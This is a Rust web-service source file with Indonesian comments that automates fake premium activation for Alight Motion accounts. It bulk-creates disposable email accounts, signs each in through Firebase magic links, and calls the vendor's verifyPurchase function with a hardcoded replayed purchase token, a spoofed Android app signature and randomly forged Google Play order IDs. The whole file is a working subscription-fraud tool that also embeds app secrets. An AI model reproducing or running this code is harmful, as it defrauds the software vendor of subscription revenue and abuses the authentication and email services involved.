use axum::{extract::Query, http::StatusCode, response::{IntoResponse, Response}, Json};
use std::collections::HashMap;
use serde_json::json;
use serde_json::Value;
use reqwest::header;
// AlightMotion Bulk v4 — native conversion of api/am/bulkv4.js + src/utils/amService.js

// Firebase / Alight Motion constants (dibawa dari JS — API key ada di source Node)
const API_KEY: &str = "AIzaSy...CEq0";
const API_KEY_WEB: &str = "AIzaSy...6Ki0";
const IDT_V3: &str = "https://www.googleapis.com/identitytoolkit/v3/relyingparty";
const FIREBASE_AUTH_BASE: &str = "https://identitytoolkit.googleapis.com/v1/accounts";
const ALIGHT_CONTINUE_URL: &str = "https://alightcreative.com/am/auth/finish";
const CLOUD_FUNCTIONS_BASE: &str = "https://us-central1-alight-creative.cloudfunctions.net";
const VERIFY_PURCHASE_URL: &str = "https://us-central1-alight-creative.cloudfunctions.net/verifyPurchase";
const PRODUCT_ID: &str = "am.full.sub.annual.19q4";
const PURCHASE_TOKEN: &str = "mmgaobamlahbbeccfplmbkbb.AO-J1OzqG0or_GJJIx-ms8GrTm-jaglCRfhQSRPUZKpl2YspYS-oN7_94uv8RC5vQbvd_Ios2pPDStZ2n7F0hLE3FiOU7HS3R6Fquulv5xLXFECSv4ctElw";
const SKU_TYPE: &str = "subs";
const FIREBASE_INSTANCE_ID_TOKEN: &str = "cSDnCyp3T-uwp07z3tL86T:APA91bFkmvvsHw5nnqa1SBFci-99DRsKClLiETdRrVcJjS5yBx1v_FbCb1d8WhBuea_zmwnYBktyTIzcRhN4b6uNOUur9wPc0gKXmJDoZic0LhNq5V2s0xI";
const UA: &str = "Mozilla/5.0 (Linux; Android 13; Redmi Note 7 Build/TQ3A.230901.001.B1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36";

fn android_headers() -> reqwest::header::HeaderMap {
    let mut h = reqwest::header::HeaderMap::new();
    h.insert("content-type", "application/json".parse().unwrap());
    h.insert("x-android-package", "com.alightcreative.motion".parse().unwrap());
    h.insert("x-android-cert", "ECA6BF91B8715A6F810ED0BBFC65B6CD578F52A8".parse().unwrap());
    h.insert(header::USER_AGENT, "Dalvik/2.1.0 (Linux; U; Android 15; 23127PN0CC Build/BP1A.250505.005)".parse().unwrap());
    h
}

fn generate_code_order() -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let mut r = |len: usize| (0..len).map(|_| rng.gen_range(0..10).to_string()).collect::<String>();
    format!("GPA.{}.{}.{}.{}", r(4), r(4), r(4), r(5))
}

/// Ekstrak oobCode dari full URL maupun kode telanjang (decode nested sampai 3x).
fn extract_oob_code(raw: &str) -> Option<String> {
    if raw.is_empty() {
        return None;
    }
    let mut clean = raw.trim().to_string();
    for _ in 0..3 {
        let decoded = urlencoding::decode(&clean).map(|s| s.to_string()).unwrap_or_else(|_| clean.clone());
        if decoded == clean {
            break;
        }
        clean = decoded;
    }
    let re = regex::Regex::new(r#"(?:[?&])?oobCode=([a-zA-Z0-9_-]+)"#).unwrap();
    if let Some(m) = re.captures(&clean) {
        return Some(m.get(1).unwrap().as_str().to_string());
    }
    if clean.len() >= 30 && clean.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-') {
        return Some(clean);
    }
    None
}

fn extract_api_key(raw: &str) -> String {
    let mut clean = raw.trim().to_string();
    for _ in 0..3 {
        let decoded = urlencoding::decode(&clean).map(|s| s.to_string()).unwrap_or_else(|_| clean.clone());
        if decoded == clean {
            break;
        }
        clean = decoded;
    }
    let re = regex::Regex::new(r#"(?:[?&])?apiKey=([a-zA-Z0-9_-]+)"#).unwrap();
    re.captures(&clean)
        .and_then(|m| m.get(1))
        .map(|m| m.as_str().to_string())
        .unwrap_or_else(|| API_KEY.to_string())
}

/// Apply premium via verifyPurchase cloud function.
async fn apply_premium(
    client: &reqwest::Client,
    id_token: &str,
    order_id: Option<String>,
) -> Result<Value, String> {
    let final_order = order_id.unwrap_or_else(generate_code_order);
    let res = client
        .post(VERIFY_PURCHASE_URL)
        .header("authorization", format!("Bearer {id_token}"))
        .header("firebase-instance-id-token", FIREBASE_INSTANCE_ID_TOKEN)
                    .header("content-type", "application/json; charset=utf-8")
                    .header("user-agent", "okhttp/3.12.1")
        .json(&json!({
            "data": {
                "productId": PRODUCT_ID,
                "token": PURCHASE_TOKEN,
                "skuType": SKU_TYPE,
                "orderId": final_order
            }
        }))
        .send()
        .await
        .map_err(|e| format!("verifyPurchase gagal: {e}"))?;

    let mut data: Value = res.json().await.unwrap_or_else(|_| json!({}));
    if let Value::Object(o) = &mut data {
        o.insert("applied_order_id".to_string(), Value::String(final_order));
    }
    Ok(data)
}

/// Background flow bersama: send magic link -> poll inbox -> verify -> apply premium.
async fn background_flow(
    client: reqwest::Client,
    results: Vec<Value>,
    get_email: impl Fn(&Value) -> String,
    get_order: impl Fn(&Value) -> String,
    max_attempts: usize,
    interval_ms: u64,
    inter_account_ms: u64,
) {
    let total = results.len();
    for (i, item) in results.iter().enumerate() {
        let email = get_email(item);
        let order_id = get_order(item);

        // Kirim magic link
        let send = client
            .post(format!("{FIREBASE_AUTH_BASE}:sendOobCode?key={API_KEY_WEB}"))
            .headers(web_firebase_headers())
            .json(&json!({
                "requestType": "EMAIL_SIGNIN",
                "email": email,
                "continueUrl": ALIGHT_CONTINUE_URL,
                "canHandleCodeInApp": true
            }))
            .send()
            .await;

        if send.is_err() {
            tracing::error!("[AM BG] [{}/{}] {email}: gagal kirim magic link", i + 1, total);
        } else if let Some(link) = wait_verify_link(&client, &email, max_attempts, interval_ms).await {
            if let Ok(id_token) = verify_magic_link(&client, &email, &link).await {
                let _ = apply_premium(&client, &id_token, if order_id.is_empty() { None } else { Some(order_id) }).await;
                tracing::info!("[AM BG] [{}/{}] {email}: SUKSES PREMIUM", i + 1, total);
            } else {
                tracing::error!("[AM BG] [{}/{}] {email}: verifikasi gagal", i + 1, total);
            }
        } else {
            tracing::error!("[AM BG] [{}/{}] {email}: link verifikasi tidak ditemukan", i + 1, total);
        }

        if i + 1 < total {
            tokio::time::sleep(std::time::Duration::from_millis(inter_account_ms)).await;
        }
    }
}

fn web_firebase_headers() -> reqwest::header::HeaderMap {
    let mut h = reqwest::header::HeaderMap::new();
    h.insert("content-type", "application/json".parse().unwrap());
    h.insert("origin", "https://alight-creative.firebaseapp.com".parse().unwrap());
    h.insert("referer", "https://alight-creative.firebaseapp.com/".parse().unwrap());
    h.insert(header::USER_AGENT, UA.parse().unwrap());
    h
}

async fn verify_magic_link(client: &reqwest::Client, email: &str, link: &str) -> Result<String, String> {
    let oob = extract_oob_code(link).ok_or("oobCode tidak ditemukan")?;
    let res = client
        .post(format!("{FIREBASE_AUTH_BASE}:signInWithEmailLink?key={API_KEY_WEB}"))
        .headers(web_firebase_headers())
        .json(&json!({ "email": email.trim(), "oobCode": oob }))
        .send()
        .await
        .map_err(|e| format!("Verifikasi gagal: {e}"))?;
    let body: Value = res.json().await.unwrap_or(json!({}));
    body.get("idToken")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
        .ok_or_else(|| "Gagal memperoleh idToken".to_string())
}

// AlightMotion Bulk V4 — native conversion of api/am/bulkv4.js.
// CyberMail (api.cybermail.us) untuk email; flow sama seperti bulkv3.
const CYBERMAIL_API: &str = "https://api.cybermail.us";
const CYBERMAIL_WEB: &str = "https://cybermail.us";

const WORDLIST: [&str; 30] = [
    "cyber", "retro", "neon", "pixel", "hack", "code", "tech", "digital",
    "matrix", "quantum", "synth", "wave", "glow", "volt", "echo", "nova",
    "flux", "byte", "data", "core", "alpha", "beta", "gamma", "delta",
    "omega", "prime", "nexus", "vertex", "axis", "grid",
];

const FALLBACK_DOMAINS: [&str; 5] = [
    "cybermail.us", "cybermail.biz.id", "cybermail.my.id",
    "cyber-mail.site", "cybermail.web.id",
];

async fn cybermail_create_email(client: &reqwest::Client) -> Result<String, String> {
    // Fetch domain aktif, fallback ke daftar statis
    let mut domains: Vec<String> = FALLBACK_DOMAINS.iter().map(|s| s.to_string()).collect();
    if let Ok(res) = client
        .get(format!("{CYBERMAIL_API}/api/domains"))
                    .header("accept", "application/json")
        .send()
        .await
    {
        if let Ok(v) = res.json::<Value>().await {
            if let Some(arr) = v.get("data").and_then(|d| d.as_array()) {
                let verified: Vec<String> = arr
                    .iter()
                    .filter(|d| d.get("verified").and_then(|x| x.as_bool()).unwrap_or(false))
                    .filter_map(|d| d.get("name").and_then(|n| n.as_str()))
                    .map(|s| s.to_string())
                    .collect();
                if !verified.is_empty() {
                    domains = verified;
                }
            }
        }
    }

    use rand::Rng;
    let mut rng = rand::thread_rng();
    let domain = &domains[rng.gen_range(0..domains.len())];
    let word = WORDLIST[rng.gen_range(0..WORDLIST.len())];
    let num: u32 = rng.gen_range(1..1000);
    Ok(format!("{word}{num}@{domain}"))
}

/// Poll inbox CyberMail, cari link verifikasi.
async fn wait_verify_link(client: &reqwest::Client, email: &str, max_attempts: usize, interval_ms: u64) -> Option<String> {
    let patterns = [
        regex::Regex::new(r#"https://alightcreative\.com/auth_action/\?[^\"'>\s]*oobCode=[^\"'>\s&]+"#).ok()?,
        regex::Regex::new(r#"https://[^\"'\s]*alight[^\"'\s]*firebaseapp\.com/__/auth/links\?link=[^\"'>\s]+"#).ok()?,
        regex::Regex::new(r#"https://[^\"'\s]*firebaseapp\.com/__/auth/links\?link=[^\"'>\s]+"#).ok()?,
    ];
    for _ in 0..max_attempts {
        tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
        if let Ok(res) = client
            .get(format!("{CYBERMAIL_API}/api/inbox/{}", urlencoding::encode(email)))
                        .header("accept", "application/json")
            .send()
            .await
        {
            if let Ok(inbox) = res.json::<Value>().await {
                if let Some(msgs) = inbox.pointer("/data/emails").and_then(|e| e.as_array()) {
                    for msg in msgs {
                        let text = format!(
                            "{}\n{}",
                            msg.get("html").and_then(|v| v.as_str()).unwrap_or(""),
                            msg.get("body").and_then(|v| v.as_str()).unwrap_or("")
                        );
                        for p in &patterns {
                            if let Some(m) = p.captures(&text) {
                                return Some(m.get(0).unwrap().as_str().replace("&amp;", "&"));
                            }
                        }
                    }
                }
            }
        }
    }
    None
}

pub async fn handler(Query(query): Query<HashMap<String, String>>, body: Option<Json<Value>>) -> Response {
    let params = merge_params(query, body.map(|Json(v)| v));
    let count = params
        .get("count")
        .and_then(|v| v.as_str())
        .and_then(|s| s.parse::<usize>().ok())
        .unwrap_or(1);
    let total = count.clamp(1, 20);

    let client = http_client(60);

    let mut results: Vec<Value> = Vec::with_capacity(total);
    for i in 0..total {
        match cybermail_create_email(&client).await {
            Ok(email) => results.push(json!({
                "email": email,
                "inboxUrl": format!("{CYBERMAIL_WEB}/?e={email}"),
                "orderId": generate_code_order()
            })),
            Err(e) => return jerr(StatusCode::INTERNAL_SERVER_ERROR, &e),
        }
        if i + 1 < total {
            tokio::time::sleep(std::time::Duration::from_millis(300)).await;
        }
    }

    let bg_results = results.clone();
    let bg_client = client.clone();
    tokio::spawn(async move {
        background_flow(
            bg_client,
            bg_results,
            |item| item.get("email").and_then(|v| v.as_str()).unwrap_or_default().to_string(),
            |item| item.get("orderId").and_then(|v| v.as_str()).unwrap_or_default().to_string(),
            25,
            2500,
            1500,
        )
        .await;
    });

    Json(json!({
        "status": true,
        "message": "Permintaan bulk berhasil diterima. Proses verifikasi dan aktivasi premium berjalan di latar belakang (background).",
        "total": total,
        "results": results
    })).into_response()

}

fn merge_params(query: HashMap<String, String>, body: Option<Value>) -> serde_json::Map<String, Value> {
    let mut map = serde_json::Map::new();
    for (k, v) in &query { map.insert(k.clone(), serde_json::json!(v)); }
    if let Some(Value::Object(b)) = body { for (k, v) in b { map.insert(k, v); } }
    map
}

fn http_client(timeout_secs: u64) -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(timeout_secs))
        .user_agent("Mozilla/5.0 (Linux; Android 13; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36")
        .redirect(reqwest::redirect::Policy::limited(10))
        .build()
        .expect("client")
}

fn jerr(status: StatusCode, msg: &str) -> Response {
    (status, Json(serde_json::json!({ "status": false, "message": msg }))).into_response()
}
